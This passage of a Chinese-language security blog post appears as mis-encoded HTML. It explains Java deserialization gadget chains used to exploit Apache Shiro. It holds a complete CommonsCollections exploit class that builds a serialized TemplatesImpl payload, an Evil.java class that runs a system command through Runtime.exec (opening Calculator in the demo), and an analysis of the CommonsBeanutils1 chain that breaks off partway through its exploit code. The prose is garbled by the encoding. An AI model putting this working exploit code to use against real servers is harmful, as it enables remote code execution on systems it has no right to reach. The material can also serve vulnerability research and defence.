07.45.51@2x"></p><p>é¦–å…ˆè¿˜æ˜¯åˆ›å»º TemplatesImpl å¯¹è±¡ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-built_in">byte</span>[] code = Files.readAllBytes(Paths.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;Evil.class&quot;</span>));<br><span class="hljs-built_in">byte</span>[][] codes = &#123;code&#125;;<br>setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>setFieldValue(templates, <span class="hljs-string">&quot;_auxClasses&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// å…³é”®ä¿®å¤</span><br>setFieldValue(templates, <span class="hljs-string">&quot;_outputProperties&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// å¯é€‰ä½†æ¨è</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç”¨æ¥è°ƒç”¨ newTransformer æ–¹æ³•çš„ InvokerTransformerï¼Œä½†æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶å…ˆä¼ å…¥ä¸€ä¸ªæ­£å¸¸çš„æ–¹æ³•ï¼Œæ¯”å¦‚ <code>getClass</code> ï¼Œé¿å…æ¶æ„æ–¹æ³•åœ¨æ„é€  Gadget çš„æ—¶å€™è§¦å‘ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">InvokerTransformer invokerTransformer = <span class="hljs-built_in">new</span> InvokerTransformer(&quot;newTransformer&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;&#125;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;);<br></code></pre></td></tr></table></figure><p>å†æŠŠä¹‹å‰çš„ CommonsCollections6 çš„ä»£ç å¤åˆ¶è¿‡æ¥ï¼Œå°†åŸæ¥ TiedMapEntry æ„é€ æ—¶çš„ç¬¬äºŒä¸ªå‚æ•° keyï¼Œæ”¹ä¸ºå‰é¢åˆ›å»ºçš„ TemplatesImpl å¯¹è±¡ï¼š</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; <span class="hljs-built_in">map</span> = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br>Map&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; lazyMap = LazyMap.<span class="hljs-property">decorate</span>(<span class="hljs-built_in">map</span>, invokerTransformer);<br>TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new </span><span class="hljs-class title_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">// ä¼ è¿›æ¥æ¶æ„ç±»</span><br>BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new </span><span class="hljs-class title_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_">setFieldValue</span>(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, tiedMapEntry);<br></code></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiroexp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;Evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_auxClasses&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// å…³é”®ä¿®å¤</span><br>        setFieldValue(templates, <span class="hljs-string">&quot;_outputProperties&quot;</span>, <span class="hljs-literal">null</span>); <span class="hljs-comment">// å¯é€‰ä½†æ¨è</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, invokerTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, tiedMapEntry);<br><br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;shiro.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span><br>            <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, fieldValue);<br>    &#125;<br><span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ç”¨åˆ°çš„æ¶æ„Evil.javaç±»ä»£ç å¦‚ä¸‹ï¼Œjavacè¿›è¡Œç¼–è¯‘ï¼Œæ³¨é‡Šä¸­çš„æ˜¯å¿…é¡»å­˜åœ¨çš„ä¸œè¥¿å¦åˆ™ä¼šå¤±è´¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-comment">// å¿…é¡»æœ‰æ— å‚æ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        executePayload();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executePayload</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// macOS å¼¹å‡ºè®¡ç®—å™¨å‘½ä»¤</span><br>            String[] cmd = &#123;<br>                    <span class="hljs-string">&quot;/usr/bin/osascript&quot;</span>,<br>                    <span class="hljs-string">&quot;-e&quot;</span>,<br>                    <span class="hljs-string">&quot;tell application \&quot;Calculator\&quot; to activate&quot;</span><br>            &#125;;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-comment">// é™é»˜å¤„ç†å¼‚å¸¸</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å¿…é¡»å®ç° transform æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œshiroexpå³å¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åŒ…çš„å¤„ç†é—®é¢˜ï¼Œç”Ÿæˆäº†shiro.binå†å»è·‘æˆ‘ä»¬çš„åŠ å¯†è„šæœ¬å³å¯å¾—åˆ°payload</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2010.33.20@2x.png" alt="CleanShot 2025-08-08 at 10.33.20@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2010.41.53@2x.png" alt="CleanShot 2025-08-08 at 10.41.53@2x"></p><h2 id="CommonsBeanutils1-åˆ†æåˆ©ç”¨"><a href="#CommonsBeanutils1-åˆ†æåˆ©ç”¨" class="headerlink" title="CommonsBeanutils1 åˆ†æåˆ©ç”¨"></a>CommonsBeanutils1 åˆ†æåˆ©ç”¨</h2><p>å› ä¸ºåŸç”Ÿshiroè‡ªå·±æ˜¯ä¸ç”¨åˆ°CommonsCollectionsä¾èµ–çš„ï¼Œæ‰€ä»¥ä¸Šæ–¹æ‰“CCé“¾éƒ½æ˜¯æˆ‘ä»¬æ‰‹åŠ¨æ·»åŠ ä¾èµ–è¿›å»ï¼ˆä¸è¿‡åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹ä¹Ÿæ˜¯ä¼šå­˜åœ¨CommonsCollectionsï¼‰ï¼Œå¦‚æœæ˜¯çº¯åŸç”Ÿshiroçš„è¯å°±éœ€è¦ç”¨CommonsBeanutils1æ¥åˆ©ç”¨</p><p>Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€š Java ç±»å¯¹è±¡(ä¹Ÿç§°ä¸º <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>)çš„ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œç›¸å½“äºä¸€ä¸ªå¢å¼ºåŠŸèƒ½çš„ä¾èµ–åŒ…ï¼Œä¾‹å¦‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript">final <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;catalina&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> name</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2015.53.51@2x.png" alt="CleanShot 2025-08-08 at 15.53.51@2x"></p><p>commons-beanutils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼Œæ¯”å¦‚åˆšæ‰çš„ï¼š<code>PropertyUtils.getProperty(person, &quot;name&quot;);</code></p><p>æ­¤æ—¶ï¼Œ<code>commons-beanutils</code> ä¼šè‡ªåŠ¨æ‰¾åˆ° name å±æ€§çš„ getter æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getNameï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œ <code>PropertyUtils.getProperty</code> è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚ a å¯¹è±¡ä¸­æœ‰å±æ€§ bï¼Œb å¯¹è±¡ä¸­æœ‰å±æ€§ cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¯¥æ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„ getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®š JavaBean æ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨ã€‚</p><p>é‚£ä¹ˆç›´æ¥å°±åœ¨è¿™ä¸ªè°ƒç”¨çš„åœ°æ–¹æ‰“æ–­ç‚¹è¿›å»æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œè¿›å…¥ä¹‹åå…ˆæ˜¯è°ƒäº†getPropertyåå†æ¬¡è°ƒç”¨äº†å¦ä¸€ä¸ªå¯¹è±¡çš„getPropertyï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªgetProperty</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.03.54@2x.png" alt="CleanShot 2025-08-08 at 16.03.54@2x"></p><p>ç„¶åæ˜¯è¿™ä¸ªæ–¹æ³•<code>getNestedProperty</code>ï¼Œè¿›åˆ°è¿™ä¸ªæ–¹æ³•çœ‹ä¸€ä¸‹ï¼Œä¸€è¿ä¸²çš„åˆ¤æ–­ï¼Œå…¶å®å°±æ˜¯å¦‚æœæ˜¯Mapã€Indexå°±è¿›å¯¹åº”çš„æ–¹æ³•ï¼Œä¸æ˜¯å°±åˆ°æœ€åä¸€ä¸ªgetSimplePropertyæ–¹æ³•</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.12.22@2x.png" alt="CleanShot 2025-08-08 at 16.12.22@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.06.05@2x.png" alt="CleanShot 2025-08-08 at 16.06.05@2x"></p><p>å¯ä»¥çœ‹åˆ°ä»è¿™é‡Œå¼€å§‹å°±å·²ç»å®ç°getNameæ–¹æ³•ï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„nameè½¬åŒ–ä¸ºäº†å¯¹åº”çš„getæ–¹æ³•ï¼Œè¿™æ®µä»£ç ä»”ç»†çœ‹ä¸€ä¸‹ä¹Ÿå°±æ˜¯å®ç°äº†è¿™ä¸ªæ•ˆæœï¼Œé‚£ä¹ˆåˆ°æ­¤å°±å¤§æ¦‚äº†è§£äº†æµç¨‹</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.14.25@2x.png" alt="CleanShot 2025-08-08 at 16.14.25@2x"></p><p>é‚£ä¹ˆæ—¢ç„¶å¯ä»¥å°†å±æ€§è½¬åŒ–ä¸ºå¯¹åº”çš„getæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æƒ³åˆ°äº†TemplatesImplç±»ä¸­çš„getOutputPropertiesï¼Œè¿™é‡Œè°ƒç”¨äº†newTransformer().getOutputProperties()ï¼Œæˆ‘ä»¬çŸ¥é“newTransformeræ˜¯å¯ä»¥åŠ¨æ€åŠ è½½è€Œå®ç°ä»£ç æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å°è¯•åˆ©ç”¨è¿™ä¸€ç‚¹</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.29.16@2x.png" alt="CleanShot 2025-08-08 at 16.29.16@2x"></p><p>æŠŠåˆšæ‰CommonsCollectionsçš„ç›´æ¥æ‹¿è¿‡æ¥ï¼Œæ˜¯æ²¡é—®é¢˜çš„</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2016.42.54@2x.png" alt="CleanShot 2025-08-08 at 16.42.54@2x"></p><p>é‚£ä¹ˆå›åˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨getPropertyçš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯<code>org.apache.commons.beanutils.PropertyUtils#getProperty</code>æ–¹æ³•ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•çš„ç”¨æ³•ï¼Œæ‰¾ä¸€ä¸‹å¯èƒ½ååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œå®šä½åˆ°<code>org.apache.commons.beanutils.BeanComparator#compare</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.32.26@2x.png" alt="CleanShot 2025-08-08 at 18.32.26@2x"></p><p>è¿™ä¸ªæ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œå¦‚æœ <code>this.property</code> ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚å¦‚æœ <code>this.property</code> ä¸ä¸ºç©ºï¼Œåˆ™ç”¨ <code>PropertyUtils.getProperty</code> åˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ <code>this.property</code> å±æ€§ï¼Œæ¯”è¾ƒå±æ€§çš„å€¼ã€‚<code>PropertyUtils.getProperty</code> è¿™ä¸ªæ–¹æ³•ä¼šè‡ªåŠ¨å»è°ƒç”¨ä¸€ä¸ª <code>JavaBeançš„getter</code> æ–¹æ³•ï¼Œ è¿™ä¸ªç‚¹æ˜¯ä»»æ„ä»£ç æ‰§è¡Œçš„å…³é”®ã€‚</p><p>åœ¨åˆ†æ <code>TemplatesImpl</code> åˆ©ç”¨é“¾çš„æ–‡ç« ä¸­æŒ‡å‡ºï¼Œ<code>TemplatesImpl#getOutputProperties()</code> æ–¹æ³•æ˜¯è°ƒç”¨é“¾ä¸Šçš„ä¸€ç¯ï¼Œå®ƒçš„å†…éƒ¨è°ƒç”¨äº† <code>TemplatesImpl#newTransformer()</code> ï¼Œä¹Ÿå°±æ˜¯åé¢å¸¸ç”¨æ¥æ‰§è¡Œæ¶æ„å­—èŠ‚ç çš„æ–¹æ³•ï¼š</p><p>è¿™é‡Œå¯ä»¥ç®€å•è¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆorg.apache.commons.beanutils.BeanComparator#compareå¯ä»¥åˆ©ç”¨ï¼ŒCC2åˆ©ç”¨é“¾ä¸­ä½¿ç”¨çš„æ˜¯PriorityQueueä¼˜å…ˆé˜Ÿåˆ—é‡Œçš„è·Ÿè¸ª</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#heapify</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#siftDownUsingComparator</span><br>java<span class="hljs-selector-class">.util</span>.Comparator#compare<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.44.30@2x.png" alt="CleanShot 2025-08-08 at 18.44.30@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.45.57@2x.png" alt="CleanShot 2025-08-08 at 18.45.57@2x"></p><p>é‚£ä¹ˆè·Ÿè¿›å»TransformingComparatorï¼Œä½ ä¼šå‘ç°compareè°ƒç”¨äº†transformer.transformï¼Œé‚£ä¹ˆå°±ç±»ä¼¼äº†ï¼ŒCC2è¿™é‡Œèƒ½ç”¨é‚£ä¹ˆCBè¿™é‡Œèƒ½ç”¨ä¹Ÿæ˜¯ä¸€æ ·çš„æ•ˆæœï¼Œä¹Ÿæ˜¯ä»ä¼˜å…ˆé˜Ÿåˆ—å…¥æ‰‹</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-08%20at%2018.47.15@2x.png" alt="CleanShot 2025-08-08 at 18.47.15@2x"></p><p>æœ€ç»ˆåˆ©ç”¨é“¾ä¸ºä»ä¼˜å…ˆé˜Ÿåˆ—PriorityQueue.readObjectä¸ºå…¥å£</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PriorityQueue<span class="hljs-selector-class">.readObject</span><br>BeanComparator<span class="hljs-selector-class">.compare</span><br>PropertyUtils<span class="hljs-selector-class">.getProperty</span><br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span><br>TemplatesImpl<span class="hljs-selector-class">.newTransformer</span><br>defineClass.newInstance<br></code></pre></td></tr></table></figure><p>å®Œæ•´expå¦‚ä¸‹ï¼Œæ¶æ„ç±»ä¾æ—§æ˜¯ä¸Šé¢çš„evil.classï¼Œè¿™æ¡é“¾æ˜¯ä¸éœ€è¦CommonsCollectionsä¾èµ–çš„ï¼Œæˆ‘æŠŠCommonsCollectionsä¾èµ–å…¨ç§»é™¤æ‰ï¼Œè¿™æ˜¯æ ¹æ®æŠ¥é”™CBå‡ºç°çš„é—®é¢˜ä¿®æ”¹åçš„expï¼ŒæŠ¥é”™è§£å†³åŠæ³•è¯·çœ‹ä¸‹æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 